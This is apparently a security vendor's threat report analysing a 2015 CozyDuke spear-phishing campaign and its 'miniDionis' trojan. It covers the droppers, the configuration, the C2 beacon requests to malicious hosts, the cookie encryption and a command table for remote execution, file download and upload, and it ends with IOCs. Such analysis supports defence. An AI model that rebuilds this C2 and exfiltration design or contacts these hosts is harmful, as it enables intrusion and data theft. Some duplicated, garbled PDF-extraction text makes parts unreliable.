    "plain_text": "## Executive Summary\n\nUnit 42 has uncovered a new campaign from the CozyDuke threat actors, aka CozyCar [1], leveraging\n\nmalware that appears to be related to the Seaduke malware described earlier this week by Symantec. [2]\n\nThis campaign, which began on July 7, 2015, appears to be targeted at government organizations and\n\nthink-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear\n\nphishing and command and control activity.\n\nUnit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service, which allows\n\nanalysts to quickly find correlations among malware samples analyzed by WildFire. All files referenced\n\nthroughout the analysis are contained in the IOC table at the end of this blog.\n\n## Malware Details\n\n**The Initial Droppers: Decoy and Downloader**\n\nThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a\n\nlink to a .zip file on a compromised website or by direct delivery as an attachment to the phish.\n\nAt the time of our analysis, the phishing link was no longer active. When a user opens the attached file a\n\npoorly detected executable file [VT 1/54] is extracted. The initial dropper is a self-extracting archive (SFX).\n\nUpon execution, this executable file will drop two files in the %TEMP% directory: a decoy .wav file and the\n\nsecondary dropper.\n\nThe CozyDuke group commonly uses legitimate media files to trick users. In reality, while the media — a\n\n.wav file with a female voice claiming to be a reporter looking for commentary — is played, the secondary\n\ndropper executes in the background. The secondary dropper requests a .swf file using SSL as illustrated in\n\nthe HTTP traffic below.\n\nAs of this writing, the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200.\n\n\nGET /webscriptsecurity/view/4/player.swf HTTP/1.1\nAccept: text/html,application/xhtml+xml,*/*\nAccept-Language: en_US\nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1;  Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\nHost: extranet.qualityplanning[.]com\nConnection: Keep-Alive\n\n\nGET /webscriptsecurity/view/4/player swf HTTP/1 1\n\n\n-----\n\nAccept-Language: en_US\n\nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1;  Trident/4.0; .NET CLR 1.1.4322; .NET\nCLR 2.0.50727)\n\nHost: extranet.qualityplanning[.]com\n\nConnection: Keep-Alive\n\nThe secondary dropper then cleans up after itself with a simple vbs script\n\n(md5:0d132ee171768dc30d14590ed2dbadd1) that leaves only the decoy multimedia file behind. But what\n\ndid the dropper do with the .swf file?\n\n**The Real Payload**\n\nWhile the player.swf file downloaded by the second stage dropper does contain media, it is, again, a decoy.\n\nThe actual flash component of this file is roughly 16kb, leaving approximately 200kb of the file\n\nunaccounted for. The second stage dropper contains decoding routines that decode the arbitrary binary\n\ndata into an executable file.\n\nThe executable file is dropped in %appdata%/Roaming and appears to try and emulate legitimate software\n\nnames: TimbuktuDaemon, SearchIndexer, RtkAudioService64, dirmngr, o2flash, and usbrefs64. This file\n\nwas not observed on VirusTotal until July 9 and has extremely low detection rates [VT: 3/54].\n\nIt appears that the authors of this particular iteration of the CozyCar group’s malware internally call it\n\n“miniDionis” according to pdb strings left in the binary\n\n(c:\\BastionSolution\\Shells\\Projects\\miniDionis4\\miniDionis\\obj\\Release\\miniDionis.pdb). It also\n\nappears to be an iteration on the “forkmeimfamous” aka Seaduke malware analyzed by Unit 42 in a\n\nprevious blog [4].\n\nThe malware stores 2 files in the %temp% directory: a configuration file and a secondary dll. The\n\nconfiguration file’s name matches the final characters of the bot_id that is contained within as per the\n\nsample below:\n\n\n{\n\"bot_id\": \"8C9U-01MRLXW\",\n\"host_scripts\": [\n\"https://www.illuminatistudios.net/mobile/viewer.php\"\n]\n}\n\n\n{\n\n\n-----\n\nhost_scripts : [\n\n\"https://www.illuminatistudios.net/mobile/viewer.php\"\n\n]\n\n}\n\nFigure 1. .net disassembly of the primary payload shows the author’s name for the project, “miniDionis”.\n\nAnalysis of the secondary dll file (name matches [A-Z0-9]{1}\\.tmp) indicates that its primary function is\n\nto serve as a cleanup mechanism for the dropped binary. This is likely an attempt to thwart forensic\n\ninvestigations.\n\nFurther examination of memory dumps taken following the execution of miniDionis reveals some clues\n\ninto the beaconing activity exhibited. The malware stores configuration values in memory as key:value\n\npairs:\n\n\n-----\n\napp_name : Wuauctl,\n\"delete_after\": false,\n\"exe_name\": \"Wuauctl.exe\"\n},\n\"cookie_name\": \"SSID\",\n\"enable_autoload\": false,\n\"first_run_delay\": 0,\n\"host_scripts\": [\n\"https://www.illuminatistudios[.]net/mobile/viewer.php\"\n],\n\"key_id\": \"01MRLXW\",\n\"keys\": {\n\"aes\": \"PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU=\",\n\"aes_iv\": \"tYa/iASKhNsyzFZjHolthw==\"\n},\n\"user_agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\"\n}\n\n|1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19|{ \"autoload_settings\": { \"app_name\": \"Wuauctl\", \"delete_after\": false, \"exe_name\": \"Wuauctl.exe\" }, \"cookie_name\": \"SSID\", \"enable_autoload\": false, \"first_run_delay\": 0, \"host_scripts\": [ \"https://www.illuminatistudios[.]net/mobile/viewer.php\" ], \"key_id\": \"01MRLXW\", \"keys\": { \"aes\": \"PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU=\", \"aes_iv\": \"tYa/iASKhNsyzFZjHolthw==\" }, \"user_agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" }|\n|---|---|\n\n\nThe configuration of miniDionis is a JSON blob with several important sections, which are described in\n\nthe table below:\n\n\n-----\n\ndictionary containing values which control the malware s behavior\n**autoload_settings**\nwhen executing via persistence mechanisms\n\nsubkey of autload_settings, defines the value to be used as the\n**app_name**\nmalware’s name\n\nsubkey of autload_settings, boolean value that defines whether the\n**delete_after**\nexecutable is to be deleted after exectuing\n\nsubkey of autload_settings, defines the value to be used as the\n**exe_name**\nexectuable file’s name\n\n**cookie_name** defines the value in which cookie data will be stored\n\n**enable_autoload** boolean value which controls persistence\n\n**first_run_delay** time in seconds to delay initial beaconing after execution\n\n**host_scripts** dictionary containing the location of C2s\n\n**key_id** equivalent to the bot_id; also used to derive values in C2 comms\n\n**keys** dictionary containing an AES key and AES IV\n\n**aes** aes value\n\n**aes_iv** aes_iv\n\nHTTP User-Agent header to be used when communicating with a\n**user_agent**\nC2\n\nTable 1. ‘miniDionis’ configuration keys\n\n**Network Communications**\n\nThe functional payload of this Trojan starts by creating a Mutex by splitting the “bot_id” value in the\n\nconfiguration on the hyphen (“-“) and using the second portion of the split string (specifically,\n\n“01MRLXW” in the case of this configuration).\n\nFrom a functionality standpoint, the Trojan uses the concept of tasks that are processed and completed\n\nusing a pool of threads. To obtain tasks, the Trojan will issue an HTTPS request to the C2 server\n\n(“host_scripts” in the configuration) that resembles the following example beacon:\n\n|app_name|subkey of autload_settings, defines the value to be used as the malware’s name|\n|---|---|\n|delete_after|subkey of autload_settings, boolean value that defines whether the executable is to be deleted after exectuing|\n|exe_name|subkey of autload_settings, defines the value to be used as the exectuable file’s name|\n|cookie_name|defines the value in which cookie data will be stored|\n|enable_autoload|boolean value which controls persistence|\n|first_run_delay|time in seconds to delay initial beaconing after execution|\n|host_scripts|dictionary containing the location of C2s|\n|key_id|equivalent to the bot_id; also used to derive values in C2 comms|\n|keys|dictionary containing an AES key and AES IV|\n|aes|aes value|\n|aes_iv|aes_iv|\n|user_agent|HTTP User-Agent header to be used when communicating with a C2|\n\n\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\n\n\nGET /mobile/viewer.php HTTP/1.1\n\nAccept: */*\n\nAccept-Language: en-US\n\n\n-----\n\nHost: www.illuminatistudios[.]net\n\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\n\nAccept-Encoding: gzip, deflate\n\nConnection: Keep-Alive\n\nThe Trojan manually creates the cookie in this HTTP request. The cookie contains ciphertext that the\n\nTrojan creates based on the “bot_id” in the JSON configuration. The Trojan compresses the “bot_id”\n\nstring using zlib and then encrypts it using the RC4 algorithm using a generated key. The generated key is\n\na SHA1 hash of two randomly created strings: the first of which is between 2 and 8 bytes long and the\n\nsecond is between 1 and 7 characters in length.\n\nThe ciphertext of the “bot_id” is then based64 encoded and finally the appended to the “cookie_name”\n\n(“SSID=”) in the configuration and sent within the HTTP request to the C2 server.\n\nUnit 42 did not observe the first random string (between 2 and 8 characters in length) sent to the C2 in\n\nthe first beacon, which would be required by the C2 to reproduce the exact SHA1 hash used as a key to\n\ngenerate the ciphertext in the cookie. Upon further examination we believe that the C2 will not be able to\n\ndecrypt the cookie in the first beacon. Instead, the C2 will respond to the first beacon with data that the\n\nTrojan will use to extract a string, using a function named TrExtractKey seen in Figure 2, to replace the\n\nfirst random string used to generate the SHA1 hash.\n\nOnce the C2 and Trojan have synchronized using this string, the C2 will be able to decrypt subsequent\n\nnetwork beacons because the Trojan includes the random string between 1 and 7 characters that makes up\n\nthe second half of the SHA1 hash within the cookie field before the ciphertext.\n\n|Col1|Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A Accept-Encoding: gzip, deflate Connection: Keep-Alive|\n|---|---|\n\n\n-----\n\nThe C2 communications, and several of the commands we will discuss in this blog, include a rather\n\ninteresting technique to manually handle HTTP redirection, such as the HTTP 301 Moved Permanently\n\nand HTTP 302 Found status codes.\n\nThe technique used to handle these redirections involves checking for the presence of a “Location” field\n\nwithin the HTTP headers of the server response, then using regular expressions to parse the HTML within\n\nserver response to find the appropriate URL.\n\nThe code contains three regular expressions to parse the HTML to locate the URL, the first of which is\n\n“<a.*?>.*?</a>” that locates all of the tags associated with link within the HTML.\n\nThe second regular expression of “onclick=\\”Accept();\\”” locates only links within the HTML with a\n\nspecific “onclick” action.\n\nThe last regular expression of “href\\\\s*=\\\\s*(?:[\\”‘](?<1>[^\\”‘]*)[\\”‘]|(?<1>\\\\S+))” to obtain the correct\n\nURL to interact with as the C2 server.\n\n**Command handler**\n\nOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server\n\nwill begin responding to beacons from the Trojan with JSON blobs.\n\nUnit 42 has not received any JSON blobs from an active C2 server, but based on static analysis of the\n\nTrojan determined the JSON would look as follows:\n\n\n{ 'tasks' : [ {'task_id' : \"\", 'task_data' : {'command' : \"\", 'data' : \"\"} }, ] }\n\n|Col1|{ 'tasks' : [ {'task_id' : \"\", 'task_data' : {'command' : \"\", 'data' : \"\"} }, ] }|\n|---|---|\n\n\nThe Trojan takes this JSON blob and adds each task in the list into a pool for processing. Separate worker\n\nthreads access this pool of tasks and process the commands and perform the necessary activities.\n\nUnit 42 analyzed the Trojan’s command handler and found several commands, as seen in Table 2, which\n\nallows the threat actors to carry out a full range of activities on the system.\n\n|Command|Sub-Command|Description|\n|---|---|---|\n|cmd||Checks for subcommands within the ‘data’ section, if not it attempts to run the ‘data’ using “cmd /c <data>’|\n||cd|Changes directory|\n\n\n-----\n\n|Col1|cdt|Change to temporary directory|\n|---|---|---|\n||:set_update_interval|Sets the timeout between network beacons|\n||:proxy|Configures proxy information|\n||:exit|Exits the Trojan and responds to the C2 server with “Bye!”|\n||:wget|Downloads a file from a specified URL|\n||:uploadto|Uploads a file to a specified URL|\n||exec|Launches an application and waits for it to exit|\n||execw|Launches an applications and does not wait for it to exit|\n|upl||Uploads or downloads from a list of files to or from the C2 server|\n|srv||Sends system information from the compromised system to the C2 server|\n\n\nTable 2. Available Commands within MiniDionis’ Command Handler\n\n## Conclusion\n\nThe actors behind the CozyDuke framework are highly sophisticated, motivated, and have become\n\nincreasingly bold in their campaigns.\n\nWe recommend that other security practitioners review the included Indicators of Compromise (IoCs) to\n\nensure they have not been targets in this campaign, and add the appropriate security controls to prevent\n\nfuture attacks.\n\nThis group is reliant on social engineering, and thus, user education remains of paramount importance.\n\nPalo Alto Networks customers using WildFire were protected from this campaign. All known elements of\n\nthis campaign have been accurately identified by WildFire as malicious.\n\n**IOCs**\n\ndomain ff.whitebirchpaper[.]com\n\ndomain visionresearch[.]com\n\ndomain betawebservices.ntnonline[.]com\n\ndomain staff.shasta[.]com\n\nhostname extranet.qualityplanning[.]com\n\nhostname secure.hgl[.]com\n\nhostname illuminatistudios[.]net\n\nip 103.254.16.168\n\ni 103 226 132\n\n|domain|ff.whitebirchpaper[.]com|\n|---|---|\n|domain|visionresearch[.]com|\n|domain|betawebservices.ntnonline[.]com|\n|domain|staff.shasta[.]com|\n|hostname|extranet.qualityplanning[.]com|\n|hostname|secure.hgl[.]com|\n|hostname|illuminatistudios[.]net|\n|ip|103.254.16.168|\n\n\n-----\n\n|md5|01039a95e0a14767784acc8f07035935|\n|---|---|\n|md5|0f9534b63cb7af1e3aa34839d7d6e632|\n|md5|2e64131c0426a18c1c363ec69ae6b5f2|\n|md5|70f5574e4e7ad360f4f5c2117a7a1ca7|\n|md5|1dd593ad084e1526c8facce834b0e124|\n|md5|42ffc84c6381a18b1f6d000b94c74b09|\n|md5|719cf63a3922953ceaca6fb4dbed6584|\n|md5|f415470b9f0edc1298b1f6ae75dfaf31|\n|md5|ca770a4c9881afcd610aad30aa53f651|\n|md5|24083e6186bc773cd9c2e70a49309763|\n|md5|b0a9a175e2407352214b2d005253bc0c|\n|md5|b55628a605a5dfb5005c44220ae03b8a|\n|md5|26bd36cc57e30656363ca89910579f63|\n|md5|a9c045c401afb9766e2ca838dc6f47a4|\n|md5|f8cb10b2ee8af6c5555e9cf3701b845f|\n|md5|c8b49b42e6ebb6b977ce7001b6bd96c8|\n|md5|030da7510113c28ee68df8a19c643bb0|\n|md5|e07ef8ffe965ec8b72041ddf9527cac4|\n|md5|4cbd9a0832dcf23867b092de37c10d9d|\n|md5|3a04a5d7ed785daa16f4ebfd3acf0867|\n|md5|9018fa0826f237342471895f315dbf39|\n|md5|98613ecb3afde5fc48ca4204f8363f1d|\n|md5|e00bf9b8261410744c10ae3fe2ce9049|\n|md5|51ea28f4f3fa794d5b207475897b1eef|\n|md5|3195110045f64a3c83fc3e043c46d253|\n|md5|1dd593ad084e1526c8facce834b0e124|\n|url|connectads[.]com|\n|url|kane-consulting[.]net|\n|url|edadmin.kearsney[.]com|\n|url|redbluffchamber[.]com|\n\n\n**Sources**\n\n[[1] https://securelist.com/blog/research/69731/the-cozyduke-apt/](https://securelist.com/blog/research/69731/the-cozyduke-apt/)\n\n[[2] http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory](http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory)\n\n[[3] http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/](http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/)\n\n[[4] http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/](http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/)\n\n\n-----",
